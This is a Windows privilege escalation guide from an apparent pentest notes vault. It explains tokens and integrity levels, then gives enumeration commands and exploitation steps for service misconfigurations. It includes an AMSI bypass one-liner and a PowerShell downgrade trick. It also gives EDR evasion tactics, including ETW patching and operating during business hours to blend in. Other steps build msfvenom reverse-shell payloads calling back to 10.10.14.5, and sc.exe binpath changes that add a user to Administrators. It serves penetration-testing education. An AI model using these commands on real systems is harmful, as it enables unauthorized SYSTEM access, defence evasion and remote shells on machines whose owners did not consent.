---
title: "Windows Privilege Escalation"
description: "Windows privesc master guide: token/privilege abuse, services, registry, AlwaysInstallElevated, potatoes."
category: privilege-escalation
tags: [privilege-escalation, windows, post-exploitation]
tools: [winPEAS, PowerUp, JuicyPotato]
difficulty: advanced
updated: "2026-08-09"
source: "vault:PrivEsc/PrivEsc - Windows.md"
---

# Windows Privilege Escalation Master Guide (December 2025 Edition)



---
#WindowsPrivilegeEscalation #Privileges #PrivilegeEscalation 
## Table of Contents

1. [Introduction & Philosophy](#i-introduction--philosophy)
2. [Enumeration (The Foundation)](#ii-enumeration-the-foundation)
3. [Configuration & Service Exploits](#iii-configuration--service-exploits)
4. [Credential Harvesting & Secrets](#iv-credential-harvesting--secrets)
5. [Kernel & OS Vulnerabilities](#v-kernel--os-vulnerabilities)
6. [Token Manipulation & Potato Attacks](#vi-token-manipulation--potato-attacks)
7. [Defense & OPSEC](#vii-defense--opsec)
8. [The Ultimate Cheat Sheet](#viii-the-ultimate-cheat-sheet)

---

# I. Introduction & Philosophy

## 1.1 The Windows Privilege Model

Windows employs a multi-layered security architecture built around three core concepts: **Security Identifiers (SIDs)**, **Access Tokens**, and **Integrity Levels**. Understanding these fundamentals is essential before attempting any privilege escalation technique.

### 1.1.1 Security Identifiers (SIDs)

Every security principal in Windows—users, groups, computers, and services—receives a unique Security Identifier (SID) that persists for the lifetime of that principal. SIDs are the foundation of Windows access control.

**SID Structure:**
```
S-R-X-Y1-Y2-...-Yn-RID
```

| Component | Description | Example |
|-----------|-------------|---------|
| S | Literal prefix indicating SID | S |
| R | Revision level (always 1) | 1 |
| X | Identifier Authority | 5 (NT Authority) |
| Y1-Yn | Subauthority values | 21-3623811015-3361044348-30300820 |
| RID | Relative Identifier | 1013 |

**Well-Known SIDs Critical for PrivEsc:**

| SID | Name | Significance |
|-----|------|--------------|
| S-1-5-18 | NT AUTHORITY\SYSTEM | Highest privilege local account |
| S-1-5-19 | NT AUTHORITY\LOCAL SERVICE | Reduced privilege service account |
| S-1-5-20 | NT AUTHORITY\NETWORK SERVICE | Network-facing service account |
| S-1-5-32-544 | BUILTIN\Administrators | Local admin group |
| S-1-5-32-551 | BUILTIN\Backup Operators | Can bypass file ACLs |
| S-1-5-32-548 | BUILTIN\Account Operators | Can modify non-protected users |
| S-1-5-32-549 | BUILTIN\Server Operators | Can modify services on DCs |
| S-1-5-32-550 | BUILTIN\Print Operators | Can load drivers on DCs |
| S-1-1-0 | Everyone | All authenticated users |
| S-1-5-11 | Authenticated Users | Domain-authenticated users |

### 1.1.2 Access Tokens

When a user authenticates to Windows, the Local Security Authority Subsystem Service (LSASS) creates an **access token** containing:

- User SID
- Group SIDs (all groups the user belongs to)
- Privilege list (user rights)
- Integrity level
- Session ID
- Token type (Primary or Impersonation)

**Token Types:**

| Type | Description | PrivEsc Relevance |
|------|-------------|-------------------|
| Primary Token | Attached to processes, represents security context | Target for token stealing |
| Impersonation Token | Used by threads to act on behalf of another user | Potato attacks exploit these |
| Delegation Token | Extended impersonation for multi-hop authentication | Kerberos double-hop scenarios |

**Impersonation Levels:**

| Level | Description | Exploitability |
|-------|-------------|----------------|
| Anonymous | No identification | Cannot impersonate |
| Identification | Can identify but not impersonate | Limited use |
| Impersonation | Can impersonate on local system | Primary target for Potato attacks |
| Delegation | Can impersonate across network | Most powerful, enables lateral movement |

### 1.1.3 Integrity Levels

Windows Vista introduced Mandatory Integrity Control (MIC), adding a hierarchical trust layer:

| Level | Value | Description | Examples |
|-------|-------|-------------|----------|
| Untrusted | 0x0000 | Processes with restricted tokens | Sandboxed processes |
| Low | 0x1000 | Internet-facing applications | Protected Mode IE, Edge |
| Medium | 0x2000 | Standard user processes | Most user applications |
| High | 0x3000 | Elevated/Administrator processes | Admin cmd.exe |
| System | 0x4000 | Operating system processes | Services, SYSTEM processes |
| Protected Process | 0x5000 | Anti-malware and DRM | Windows Defender, LSASS (PPL) |

**Integrity Level Verification:**
```powershell
whoami /groups | findstr "Mandatory"
```

Output interpretation:
```
Mandatory Label\Medium Mandatory Level    Label    S-1-16-8192
```
- `S-1-16-4096` = Low Integrity
- `S-1-16-8192` = Medium Integrity  
- `S-1-16-12288` = High Integrity
- `S-1-16-16384` = System Integrity

### 1.1.4 The Windows Authorization Process

When a subject (user/process) attempts to access an object (file/service/registry key):

1. **Token Presentation**: Process presents its access token
2. **Security Descriptor Retrieval**: System retrieves object's security descriptor containing:
   - Owner SID
   - Group SID
   - DACL (Discretionary Access Control List)
   - SACL (System Access Control List)
3. **ACE Evaluation**: System evaluates Access Control Entries in order:
   - Explicit Deny ACEs evaluated first
   - Explicit Allow ACEs evaluated second
   - Inherited Deny ACEs third
   - Inherited Allow ACEs last
4. **Access Decision**: Grant or deny based on cumulative permissions

**Critical Insight**: This process happens instantaneously for every resource access attempt. Attackers exploit this by:
- Manipulating tokens (impersonation attacks)
- Modifying security descriptors (weak permissions)
- Inserting themselves into the authorization process (service hijacking)

## 1.2 Living off the Land (LotL) Philosophy in 2025

Modern Windows environments deploy sophisticated endpoint detection capabilities—Windows 11 24H2 and Server 2025 include Microsoft Defender for Endpoint with advanced behavioral detection, AMSI integration across PowerShell/VBScript/JavaScript, and Credential Guard protection. Traditional attack tools trigger immediate alerts.

### 1.2.1 The LotL Imperative

Living off the Land Binaries (LOLBins) are Microsoft-signed executables that:
- Bypass application whitelisting (AppLocker, WDAC)
- Avoid signature-based detection
- Blend with legitimate system activity
- Provide plausible deniability

**2025 LOLBin Categories for PrivEsc:**

| Category | Examples | Use Case |
|----------|----------|----------|
| File Transfer | certutil, bitsadmin, curl.exe | Tool staging |
| Execution | rundll32, regsvr32, mshta, wmic | Payload execution |
| Compilation | csc.exe, msbuild.exe | On-target compilation |
| Service Manipulation | sc.exe, reg.exe | Service attacks |
| Credential Access | cmdkey, vaultcmd | Credential harvesting |

### 1.2.2 The 2025 Detection Landscape

**Current EDR Capabilities to Evade:**

| Technology | What It Detects | Evasion Strategy |
|------------|-----------------|------------------|
| ETW (Event Tracing for Windows) | Process creation, API calls, network | ETW patching, indirect syscalls |
| AMSI (Antimalware Scan Interface) | PowerShell, VBScript, JavaScript content | AMSI bypass, obfuscation |
| Kernel Callbacks | Driver loading, process/thread creation | Callback removal (requires kernel access) |
| Credential Guard | LSASS credential dumping | Target non-protected credentials |
| Protected Process Light (PPL) | LSASS process access | Bypass via vulnerable drivers |
| Smart App Control (SAC) | Reputation-based blocking | Use signed binaries, trusted publishers |

**Modern OPSEC Principles:**

1. **Minimize footprint**: Use built-in tools wherever possible
2. **Blend with noise**: Execute during normal business hours
3. **Avoid known-bad indicators**: Don't use default tool parameters/filenames
4. **Chain techniques**: Combine multiple weak findings into escalation path
5. **Test detection**: Use Defender-enabled systems during development

### 1.2.3 Primary Privilege Escalation Targets

| Target Account | Description | Priority |
|----------------|-------------|----------|
| NT AUTHORITY\SYSTEM | LocalSystem account—more privileges than local admin | Highest |
| BUILTIN\Administrators | Local administrator group membership | High |
| Domain Admins | Domain-wide administrative access | Critical (if domain-joined) |
| Specific Service Accounts | May have elevated privileges for specific tasks | Situational |

**Escalation Philosophy:**
1. Always enumerate first—understand your current context
2. Identify the shortest path to your target privilege level
3. Have backup techniques prepared
4. Document every step for client reporting
5. Consider operational impact before executing

---

# II. Enumeration (The Foundation)

## 2.1 Automated Tools Deep Dive

Automated enumeration tools rapidly identify privilege escalation vectors but generate significant noise. Understanding each tool's capabilities, limitations, and detection footprint is essential for operational success.

### 2.1.1 Tool Comparison Matrix

| Tool | Language | Purpose | OPSEC Rating | Detection Risk | Best For |
|------|----------|---------|--------------|----------------|----------|
| WinPEAS | C#/Batch | Comprehensive enumeration | ⚠️ Low | High (flagged by most AV) | Lab environments, thorough analysis |
| Seatbelt | C# | Security-focused enumeration | ⚠️ Medium | Medium-High | Targeted checks, modular execution |
| SharpUp | C# | PowerUp port to C# | ⚠️ Medium | Medium | .NET environments, compiled execution |
| PowerUp | PowerShell | Service/registry misconfig | ⚠️ Low | High (AMSI) | Quick assessment, script execution |
| PrivescCheck | PowerShell | Modern Windows checks | ⚠️ Medium | Medium (AMSI bypass options) | Windows 10/11, Server 2019+ |
| JAWS | PowerShell | PS 2.0 compatible | ✅ Higher | Lower (legacy systems) | Older systems, PS 2.0 environments |
| Watson | C# | Kernel exploit suggester | ⚠️ Medium | Medium | Patch level analysis |
| Sherlock | PowerShell | Legacy exploit suggester | ❌ Obsolete | High | Legacy (Windows 7/2008 R2) |
| BeRoot | Python | Multi-platform privesc | ⚠️ Medium | Medium | Cross-platform assessments |

### 2.1.2 WinPEAS Deep Dive

WinPEAS is the most comprehensive Windows privilege escalation enumeration tool, performing hundreds of checks across system configuration, services, applications, and credentials.

**Execution Methods:**

```batch
:: Basic execution
winpeasx64.exe

:: Quiet mode (reduced output)
winpeasx64.exe quiet

:: Fast mode (skip slow checks)
winpeasx64.exe fast

:: Specific checks only
winpeasx64.exe servicesinfo

:: Log output to file
winpeasx64.exe log=C:\temp\winpeas.txt

:: No color (for logging)
winpeasx64.exe notcolor
```

**WinPEAS Check Categories:**

| Category | What It Checks | PrivEsc Relevance |
|----------|----------------|-------------------|
| System Information | OS version, hotfixes, AV status | Kernel exploits, missing patches |
| Users Information | User privileges, groups, sessions | Token privileges, group abuse |
| Processes Information | Running processes, DLLs | DLL hijacking, process injection |
| Services Information | Service permissions, paths | Unquoted paths, weak permissions |
| Applications Information | Installed software, startup | Application-specific vulns |
| Network Information | Interfaces, listening ports | Internal services, port forwarding |
| Windows Credentials | Stored credentials, SAM access | Direct credential theft |
| Browser Information | Saved passwords, history | Credential harvesting |
| Interesting Files | Config files, scripts, keys | Credential discovery |

**WinPEAS OPSEC Considerations:**

- **Detection**: Flagged by 50+ AV engines; Windows Defender blocks by default
- **Mitigation**: Compile from source with obfuscation, or use module-by-module approach
- **Alternative**: Run individual checks manually using equivalent commands

### 2.1.3 Seatbelt Deep Dive

Seatbelt performs targeted security checks with modular execution capability, making it more suitable for operational environments.

**Execution Methods:**

```powershell
# Run all checks
.\Seatbelt.exe -group=all

# Run specific command groups
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=misc

# Run specific commands
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe WindowsCredentialFiles
.\Seatbelt.exe CredEnum

# Remote execution (requires admin on remote host)
.\Seatbelt.exe -group=remote -computername=DC01.corp.local
```

**Key Seatbelt Commands for PrivEsc:**

| Command | Description | Priority |
|---------|-------------|----------|
| `TokenPrivileges` | Current token privileges | Critical |
| `WindowsCredentialFiles` | Credential Manager files | High |
| `CredEnum` | Enumerate stored credentials | High |
| `InterestingProcesses` | Security-relevant processes | Medium |
| `LocalGroups` | Local group membership | High |
| `MappedDrives` | Network drives (may have creds) | Medium |
| `PowerShellHistory` | PS command history | High |
| `PuttyHostKeys` | Saved SSH servers | Medium |
| `SlackDownloads` | Slack file downloads | Low |
| `TokenGroups` | All group memberships | Critical |

### 2.1.4 SharpUp Deep Dive

SharpUp is a C# port of PowerUp, providing the same service/registry misconfiguration checks in a compiled format that bypasses AMSI.

**Execution:**

```powershell
# Full audit
.\SharpUp.exe audit

# Check specific vulnerabilities
.\SharpUp.exe HijackablePaths
.\SharpUp.exe ModifiableServiceBinaries
.\SharpUp.exe ModifiableServices
.\SharpUp.exe UnquotedServicePath
```

**SharpUp Check Categories:**

| Check | Description | Exploitation Path |
|-------|-------------|-------------------|
| `AlwaysInstallElevated` | MSI packages install as SYSTEM | Malicious MSI installation |
| `CachedGPPPassword` | Group Policy Preferences passwords | Direct credential recovery |
| `HijackablePaths` | Writable PATH directories | DLL hijacking |
| `McAfeeSitelistFiles` | McAfee credential files | Credential extraction |
| `ModifiableScheduledTasks` | Writable scheduled task binaries | Binary replacement |
| `ModifiableServiceBinaries` | Writable service executables | Binary replacement |
| `ModifiableServiceRegistryKeys` | Writable service registry keys | ImagePath modification |
| `ModifiableServices` | Services with weak DACLs | Service reconfiguration |
| `ProcessDLLHijack` | Running processes vulnerable to DLL hijack | DLL injection |
| `RegistryAutoLogon` | Autologon credentials in registry | Credential recovery |
| `RegistryAutoRuns` | Writable autorun locations | Persistence/escalation |
| `UnattendedInstallFiles` | Unattend.xml with credentials | Credential recovery |
| `UnquotedServicePath` | Unquoted service paths with spaces | Binary planting |

### 2.1.5 PowerUp Deep Dive

PowerUp remains the most widely-used PowerShell privilege escalation framework despite AMSI challenges.

**Execution Methods:**

```powershell
# Import the module
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Run all checks and export to HTML
Invoke-AllChecks -HTMLReport

# Individual function execution
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail -Name "VulnerableService"
```

**AMSI Bypass for PowerUp (2025):**

```powershell
# Method 1: Reflection-based bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Method 2: PowerShell downgrade (if PS 2.0 available)
powershell.exe -version 2 -ep bypass -file PowerUp.ps1

# Method 3: Obfuscated import
$code = [System.IO.File]::ReadAllText("C:\temp\PowerUp.ps1")
$code = $code -replace 'Invoke-AllChecks', 'Invoke-AC'
IEX $code
Invoke-AC
```

**Key PowerUp Functions:**

| Function | Purpose | Auto-Exploit Available |
|----------|---------|------------------------|
| `Get-UnquotedService` | Find unquoted service paths | `Write-ServiceBinary` |
| `Get-ModifiableServiceFile` | Find writable service binaries | `Install-ServiceBinary` |
| `Get-ModifiableService` | Find services with weak DACLs | `Invoke-ServiceAbuse` |
| `Get-RegistryAlwaysInstallElevated` | Check AlwaysInstallElevated | `Write-UserAddMSI` |
| `Get-RegistryAutoLogon` | Check for autologon creds | N/A |
| `Get-CachedGPPPassword` | Find cached GPP passwords | N/A |
| `Get-UnattendedInstallFile` | Find unattend.xml files | N/A |
| `Get-ModifiableRegistryAutoRun` | Find writable autorun keys | N/A |
| `Get-PathDLLHijack` | Find PATH DLL hijacking | `Write-HijackDll` |

### 2.1.6 PrivescCheck Deep Dive

PrivescCheck is a modern PowerShell script designed for Windows 10/11 and Server 2019/2022/2025, with built-in AMSI evasion options.

**Execution Methods:**

```powershell
# Basic execution
.\PrivescCheck.ps1

# Extended mode (more checks)
.\PrivescCheck.ps1 -Extended

# Specific category
.\PrivescCheck.ps1 -Extended -Category "Services"

# Export results
.\PrivescCheck.ps1 -Extended -Report PrivescCheck_Results -Format HTML,CSV

# Audit mode (minimal changes)
.\PrivescCheck.ps1 -Audit
```

**PrivescCheck Categories:**

| Category | Checks Performed |
|----------|------------------|
| User | Current user, privileges, groups, environment |
| Services | Service permissions, unquoted paths, registry |
| Scheduled Tasks | Task permissions, binary paths |
| Applications | Installed apps, startup programs |
| Credentials | Stored credentials, cached passwords |
| Hardening | Security features status (UAC, LSA, etc.) |
| Configuration | System configuration weaknesses |
| Network | Listening services, firewall rules |

## 2.2 Manual Enumeration Methodology

Automated tools are essential but understanding manual enumeration is critical when:
- Tools are detected/blocked by EDR
- Limited write access prevents tool upload
- Stealth is paramount
- Verifying automated tool findings

### 2.2.1 System Information Gathering

```batch
:: Basic system information
systeminfo

:: Hostname and domain
hostname
echo %USERDOMAIN%

:: OS version (registry method - more reliable)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ReleaseId

:: Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

:: Environment variables
set

:: System uptime (for patch assessment)
net statistics server | findstr "Statistics since"
```

```powershell
# PowerShell system enumeration
[System.Environment]::OSVersion.Version
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture
```

### 2.2.2 Patch Level Enumeration

Understanding patch level is critical for kernel exploit selection.

```batch
:: List installed hotfixes (CMD)
wmic qfe list brief

:: Filter for security updates
wmic qfe list brief | findstr /i "security"

:: Specific KB search
wmic qfe | findstr "KB5034441"
```

```powershell
# PowerShell hotfix enumeration
Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Sort-Object InstalledOn -Descending

# Check for specific critical patches
$criticalKBs = @("KB5034441", "KB5031356", "KB5028185")
$installed = Get-HotFix | Select-Object -ExpandProperty HotFixID
foreach ($kb in $criticalKBs) {
    if ($installed -contains $kb) {
        Write-Host "[+] $kb is installed" -ForegroundColor Green
    } else {
        Write-Host "[-] $kb is MISSING" -ForegroundColor Red
    }
}

# Last update check
(Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn
```

**Critical Missing Patch Indicators:**

| Scenario | Implication |
|----------|-------------|
| No patches in 6+ months | Likely vulnerable to multiple kernel exploits |
| Missing servicing stack updates | May have known privilege escalation vulns |
| Defender definitions outdated | AV may be disabled |

### 2.2.3 User and Group Enumeration

```batch
:: Current user context
whoami
echo %USERNAME%

:: Current user privileges (CRITICAL)
whoami /priv

:: Current user group membership
whoami /groups

:: All information about current user
whoami /all

:: List all local users
net user

:: Specific user details
net user Administrator
net user %USERNAME%

:: List all local groups
net localgroup

:: Members of specific groups
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Backup Operators"

:: Password policy
net accounts
```

```powershell
# Get current user privileges with state
whoami /priv | Select-String "Se"

# Enumerate local admins
Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource

# Check specific group memberships
$groups = @("Administrators", "Backup Operators", "Remote Desktop Users", "Remote Management Users")
foreach ($group in $groups) {
    Write-Host "`n[*] Members of $group :" -ForegroundColor Cyan
    Get-LocalGroupMember -Group $group -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "    $($_.Name)" }
}

# Get user description (sometimes contains passwords!)
Get-LocalUser | Select-Object Name, Enabled, Description
```

**Privilege Escalation Priority Privileges:**

| Privilege | State | Exploitation Path |
|-----------|-------|-------------------|
| SeImpersonatePrivilege | Enabled | Potato attacks (GodPotato, PrintSpoofer) |
| SeAssignPrimaryTokenPrivilege | Enabled | Potato attacks, token manipulation |
| SeDebugPrivilege | Enabled | LSASS dumping, process injection |
| SeBackupPrivilege | Enabled | SAM/SYSTEM extraction, NTDS.dit theft |
| SeRestorePrivilege | Enabled | DLL hijacking via file replacement |
| SeTakeOwnershipPrivilege | Enabled | Take ownership of any file |
| SeLoadDriverPrivilege | Enabled | Load vulnerable kernel driver |
| SeSecurityPrivilege | Enabled | Manipulate audit logs |
| SeTcbPrivilege | Enabled | Act as part of OS (impersonate anyone) |

### 2.2.4 Network Enumeration

```batch
:: Interface configuration
ipconfig /all

:: Routing table
route print

:: ARP cache (recently communicated hosts)
arp -a

:: Active connections and listening ports
netstat -ano

:: Filter for listening ports
netstat -ano | findstr "LISTENING"

:: Firewall status
netsh advfirewall show allprofiles

:: Firewall rules
netsh advfirewall firewall show rule name=all
```

```powershell
# PowerShell network enumeration
Get-NetIPConfiguration
Get-NetRoute | Where-Object {$_.NextHop -ne "0.0.0.0"} | Select-Object DestinationPrefix, NextHop, InterfaceAlias
Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess | Sort-Object LocalPort

# Identify process for listening port
$listeners = Get-NetTCPConnection -State Listen
foreach ($listener in $listeners) {
    $proc = Get-Process -Id $listener.OwningProcess -ErrorAction SilentlyContinue
    Write-Host "$($listener.LocalAddress):$($listener.LocalPort) -> $($proc.ProcessName) (PID: $($listener.OwningProcess))"
}
```

**Internal Service Discovery:**

| Binding | Significance |
|---------|--------------|
| 127.0.0.1:PORT | Localhost-only service (may lack authentication) |
| 0.0.0.0:PORT | Listening on all interfaces |
| 10.x.x.x:PORT | Listening on specific internal interface |

Common internal services to investigate:
- MySQL (3306), MSSQL (1433), PostgreSQL (5432)
- Splunk (8089), Elasticsearch (9200), Redis (6379)
- Management interfaces (8080, 8443, 9000)

### 2.2.5 Running Processes and Services

```batch
:: List all running processes with services
tasklist /svc

:: Detailed process list
tasklist /v

:: Running services
sc query

:: Services in specific state
sc query state= all | findstr "SERVICE_NAME STATE" | more

:: Service details
sc qc "ServiceName"

:: Service permissions (using sc)
sc sdshow "ServiceName"
```

```powershell
# Processes with user context
Get-Process -IncludeUserName | Select-Object ProcessName, Id, UserName | Sort-Object UserName

# Services not running as SYSTEM (potentially exploitable)
Get-WmiObject Win32_Service | Where-Object {$_.StartName -notmatch "LocalSystem|LocalService|NetworkService"} | 
    Select-Object Name, StartName, PathName, State

# Services with Auto start
Get-Service | Where-Object {$_.StartType -eq "Automatic" -and $_.Status -eq "Running"} | 
    Select-Object Name, DisplayName, Status

# Identify AV/EDR processes
$avProcesses = @("MsMpEng", "MsSense", "SenseIR", "SenseNdr", "cb", "CylanceSvc", "CSFalconService", "Tanium", "Sysmon", "emet_service")
Get-Process | Where-Object {$avProcesses -contains $_.ProcessName} | Select-Object ProcessName, Id
```

### 2.2.6 AV/EDR Enumeration

Identifying security products is essential for tool selection and evasion.

```powershell
# Windows Defender status
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, AntivirusEnabled

# Defender exclusions (if readable)
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess

# Security Center products (WMI method)
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object displayName, productState
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiSpywareProduct | Select-Object displayName, productState
Get-WmiObject -Namespace "root\SecurityCenter2" -Class FirewallProduct | Select-Object displayName, productState

# Common AV process detection
$avIndicators = @{
    "MsMpEng" = "Windows Defender"
    "MsSense" = "Microsoft Defender ATP"
    "CSFalconService" = "CrowdStrike Falcon"
    "cb" = "Carbon Black"
    "CylanceSvc" = "Cylance"
    "SentinelAgent" = "SentinelOne"
    "Tanium" = "Tanium"
    "emet_service" = "EMET"
    "Sysmon" = "Sysmon"
}

foreach ($proc in $avIndicators.Keys) {
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "[!] $($avIndicators[$proc]) detected ($proc)" -ForegroundColor Red
    }
}
```

### 2.2.7 Installed Software Enumeration

```batch
:: WMI method (slow but comprehensive)
wmic product get name,version

:: Registry method (faster)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName DisplayVersion"
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName DisplayVersion"
```

```powershell
# Installed programs via registry
$32bit = Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Select-Object DisplayName, DisplayVersion, Publisher
$64bit = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Select-Object DisplayName, DisplayVersion, Publisher
($32bit + $64bit) | Where-Object {$_.DisplayName} | Sort-Object DisplayName | Format-Table -AutoSize
```

### 2.2.8 Named Pipes Enumeration

Named pipes are inter-process communication channels that can be exploited for privilege escalation.

```batch
:: List named pipes (Sysinternals)
pipelist.exe /accepteula

:: Check pipe permissions
accesschk.exe /accepteula -w \\.\pipe\* -v
accesschk.exe /accepteula \\.\pipe\spoolss -v
```

```powershell
# List named pipes (PowerShell)
Get-ChildItem \\.\pipe\ | Select-Object Name

# Check specific pipe permissions
(Get-Acl \\.\pipe\lsass).Access | Format-Table IdentityReference, FileSystemRights
```

---

# III. Configuration & Service Exploits

## 3.1 Windows Services Exploitation

Windows services represent one of the most reliable privilege escalation vectors. Services run with specific account privileges (often SYSTEM) and have configuration files, binaries, and registry keys that may be vulnerable to manipulation.

### 3.1.1 Understanding Service Architecture

**Service Accounts and Their Privileges:**

| Account | Privileges | Network Access | PrivEsc Value |
|---------|-----------|----------------|---------------|
| LocalSystem (SYSTEM) | Full system access | Machine account credentials | Highest |
| LocalService | Limited local access | Anonymous network access | Medium |
| NetworkService | Limited local access | Machine account credentials | Medium |
| Custom account | Varies | Depends on account | Varies |

**Service Components:**

| Component | Location | Attack Vector |
|-----------|----------|---------------|
| Binary Path | File system | Binary replacement, DLL hijacking |
| Registry Key | HKLM\SYSTEM\CurrentControlSet\Services | ImagePath modification |
| Service DACL | Security descriptor | Weak service permissions |
| DLL Dependencies | Various | DLL search order hijacking |

### 3.1.2 Unquoted Service Paths

When a service binary path contains spaces and is not enclosed in quotes, Windows will attempt to locate the executable by trying each "break point" in the path.

**Example Vulnerable Path:**
```
C:\Program Files\Vulnerable Application\Sub Directory\service.exe
```

**Windows Search Order:**
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Application\Sub.exe`
4. `C:\Program Files\Vulnerable Application\Sub Directory\service.exe`

**Detection:**

```batch
:: CMD detection
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: PowerShell detection
Get-CimInstance Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match '\s' -and 
    $_.PathName -notmatch 'c:\\windows'
} | Select-Object Name, PathName, StartMode, State
```

**Exploitation:**

```powershell
# Step 1: Verify write permissions to target directory
icacls "C:\Program Files\Vulnerable Application"

# Step 2: Check service start mode
sc qc "VulnerableService"

# Step 3: Generate malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o Vulnerable.exe

# Step 4: Place binary in exploitable path
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

# Step 5: Restart service (or wait for system reboot)
sc stop VulnerableService
sc start VulnerableService
```

**Verification Script:**

```powershell
function Find-UnquotedPaths {
    $services = Get-CimInstance Win32_Service | Where-Object {$_.PathName -ne $null}
    
    foreach ($service in $services) {
        $path = $service.PathName
        
        # Skip quoted paths
        if ($path.StartsWith('"')) { continue }
        
        # Skip paths without spaces
        if ($path -notmatch '\s') { continue }
        
        # Skip Windows directory
        if ($path -match '^C:\\Windows') { continue }
        
        # Extract unquoted portion (before any arguments)
        if ($path -match '^([^"]+\.exe)') {
            $exePath = $Matches[1]
            
            # Find potential hijack locations
            $parts = $exePath -split '\\'
            $testPath = ""
            
            for ($i = 0; $i -lt $parts.Count - 1; $i++) {
                $testPath += $parts[$i]
                if ($testPath -match '\s') {
                    $hijackPath = ($testPath -split '\s')[0] + ".exe"
                    
                    # Check write permissions
                    $parentDir = Split-Path $hijackPath -Parent
                    if (Test-Path $parentDir) {
                        $acl = Get-Acl $parentDir
                        foreach ($ace in $acl.Access) {
                            if ($ace.FileSystemRights -match 'Write|FullControl|Modify' -and 
                                $ace.IdentityReference -match 'Users|Everyone|Authenticated') {
                                Write-Host "[VULN] $($service.Name): $hijackPath" -ForegroundColor Red
                                Write-Host "       Writable by: $($ace.IdentityReference)" -ForegroundColor Yellow
                            }
                        }
                    }
                }
                $testPath += "\"
            }
        }
    }
}

Find-UnquotedPaths
```

### 3.1.3 Weak Service Permissions

Services with weak DACLs allow unprivileged users to modify service configuration.

**Detection:**

```batch
:: Using accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
```

**Permission Meanings:**

| Permission | Code | Exploitation |
|------------|------|--------------|
| SERVICE_ALL_ACCESS | F | Full control - can modify everything |
| SERVICE_CHANGE_CONFIG | WP | Can change binary path |
| SERVICE_START | RP | Can start the service |
| SERVICE_STOP | WP | Can stop the service |
| WRITE_DAC | WD | Can modify service permissions |
| WRITE_OWNER | WO | Can take ownership |

**Exploitation with sc.exe:**

```batch
:: Verify current config
sc qc "VulnerableService"

:: Modify binary path to add user
sc config "VulnerableService" binpath= "cmd /c net localgroup administrators YOUR_USER /add"

:: Restart service
sc stop "VulnerableService"
sc start "VulnerableService"

:: Verify exploitation
net localgroup administrators
```

**Exploitation with PowerShell:**

```powershell
# Modify service ImagePath via registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name "ImagePath" -Value "C:\temp\payload.exe"

# Restart service
Restart-Service -Name "VulnerableService" -Force
```

**Reverse Shell Payload:**

```batch
:: Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe-service -o service_payload.exe

:: Modify service
sc config "VulnerableService" binpath= "C:\temp\service_payload.exe"
sc stop "VulnerableService"
sc start "VulnerableService"
```

### 3.1.4 Weak Service Binary Permissions

If the service binary itself is writable, it can be replaced with a malicious executable.

**Detection:**

```batch
:: Check binary permissions
icacls "C:\Program Files\VulnerableApp\service.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\VulnerableApp\service.exe"
```

```powershell
# Find writable service binaries
Get-CimInstance Win32_Service | ForEach-Object {
    $path = ($_.PathName -split '"')[1]
    if (!$path) { $path = ($_.PathName -split ' ')[0] }
    
    if (Test-Path $path) {
        $acl = Get-Acl $path
        foreach ($ace in $acl.Access) {
            if ($ace.FileSystemRights -match 'Write|FullControl|Modify' -and 
                $ace.IdentityReference -match 'Users|Everyone|Authenticated') {
                Write-Host "[VULN] $($_.Name): $path" -ForegroundColor Red
                Write-Host "       Writable by: $($ace.IdentityReference)" -ForegroundColor Yellow
            }
        }
    }
}
```

